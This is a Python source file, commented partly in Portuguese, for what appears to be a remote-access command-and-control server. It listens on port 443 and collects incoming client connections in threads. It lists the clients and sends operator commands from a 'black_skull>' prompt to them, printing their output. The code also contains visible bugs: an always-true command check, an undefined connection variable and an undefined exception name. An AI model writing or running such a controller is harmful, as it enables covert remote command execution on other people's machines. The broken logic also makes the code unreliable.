# encoding: utf-8

from src.color import colored
import socket
import sys
import threading


class Server(object):
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 443
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def start(self):
        self.build()

    def build(self):
        self.socket_create()
        self.socket_bind()
        self.persistent_connect()
        self.command()

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("erro para criar o socket: %s" % str(e))

    def socket_bind(self):
        try:
            s = self.socket
            s.bind((self.host, self.port))
            s.listen(5)
        except socket.error as e:
            print('Erro para iniciar o servidor: %s' % str(e))
            self.socket_bind()

    def persistent_connect(self):
        #for c in self.all_connections:
        #    c.close()
        #self.all_connections = []
        #self.all_addresses = []
        while True:
            try:
                conn = self.socket.accept()
                self.new_client(conn)
            except Exception as e:
                print("erro ao tentar enviar comando para o client %s" % str(e))


    '''Add a new client connection in queue and keep it alive'''
    def new_client(self, conn):
        try:
            conn, host = conn

            """Cria a thread e fica recebendo pacote da conexao. AS thread mantera a conexao viva"""
            t = threading.Thread(target=self.keep_alive, args=(conn, host))
            t.daemon = True
            t.start()

            self.all_connections.append(conn)
            self.all_addresses.append(host)
        except socket.error as e:
            print("Erro ao criar novo client: %s" % str(e))
        print(colored("[+] Client has been connected: < {host}:{port} >", color='yellow') . format(host=str(host[0]), port=str(host[1])))

    """Mantem a conexao viva após aceita-la"""
    def keep_alive(self, conn, host):
        while True:
            try:
                conn.send(str.encode(' '))
                self.listen_command(conn)
            except Exception as e:
                print(colored("[-] Client has been disconnected: < {host}:{port} >", color='red') . format(host=str(host[0]), port=str(host[1])))
                break

    """Fica aguardando os comandos"""
    def command(self):
        while True:
            cmd = input('# black_skull> ')
            if cmd == 'quit':
                self.socket_kill(conn)
                sys.exit()
            elif 'conection --list':
                self.list_connections()

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                self.listen(conn)

    """Send a command from especific connection"""
    #def send_command(self, conn):

    """Listen command from especific connection"""
    def listen_command(self, conn):
        try:
            client_response = str(conn.recv(1024), "utf-8")
            print (client_response)
        except Exception:
            print("Erro para receber responsta do cliente")

    """List all connections"""
    def list_connections(self):

        results = ''

        for i, conn in enumerate(self.all_connections):
            try:
                """Try send signal to connection"""
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]

                continue

            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'

        print('----- Clients -----')
        print(results)

    def socket_kill(self, conn):
        try:
            conn.close()
            self.socket.close()
        except s.error as e:
            print('Não foi possivel finalizar a conexao com o usuario: %s' % str(e))
            self.socket_bind()
